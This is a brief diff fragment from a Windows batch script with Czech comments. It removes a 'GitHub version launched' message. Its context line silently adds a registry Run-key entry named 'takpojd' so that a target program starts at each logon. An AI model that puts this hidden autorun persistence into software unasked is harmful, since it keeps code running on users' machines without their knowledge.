@@ -102,8 +102,8 @@ exit
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "takpojd" /t REG_SZ /d "!targetPath!" /f >nul
 
 :: ✅ Hotovo
-echo 🔥 GitHub verze spuštěna!
 exit
+
 
 
 
